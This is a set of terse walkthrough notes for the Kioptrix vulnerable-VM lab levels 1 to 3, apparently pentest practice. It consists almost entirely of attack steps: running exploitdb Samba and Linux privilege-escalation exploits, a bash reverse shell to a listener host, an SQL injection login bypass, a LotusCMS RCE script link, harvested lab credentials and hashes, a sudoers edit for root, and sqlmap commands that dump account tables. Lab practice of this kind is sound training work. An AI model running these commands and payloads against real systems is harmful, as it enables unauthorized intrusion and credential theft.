#### --Level 1-- 
enum4linux      192.168.139.128

##### searchsploit Samba 2.2

gcc /usr/share/exploitdb/exploits/multiple/remote/10.c -o exploitsamba

./exploitsamba -b 0 192.168.139.128

bash -i >& /dev/tcp/192.168.139.129/4444 0>&1

#### --Level 2--

SQL injection: admin'or '1'-'1

Welcome to the Basic Administrative Web Console

bash -i >& /dev/tcp/192.168.139.129/4444 0>&1

##### searchsploit Linux 2.6 Privilege Escalation CentOS

cp /usr/share/exploitdb/exploits/linux/local/9545.c 

localhost", "john", "hiroshima") or die(mysql_error());

mysql -u john -p
Enter password: hiroshima
show databases;

#### --Level 3--

nikto -host 192.168.139.131

##### LotusCMS-Exploit

https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh

	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";

	dreg 		0d3eccfb887aabd50f243b3f155c0f85 Mast3r
	loneferret 	5badcaf789d3d1d09794d8f021f40f0e starwars

root@kali:~# cd /usr/share/wordlists/
root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz 

loneferret@Kioptrix3:~$ export TERM=xterm   
Update: /etc/sudoers   
Then sudo su  

##### OR:  
add hostname,   

http://kioptrix3.com/gallery/  

Search db:
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs
Check table:
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --tables -D gallery
Dump password:
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump
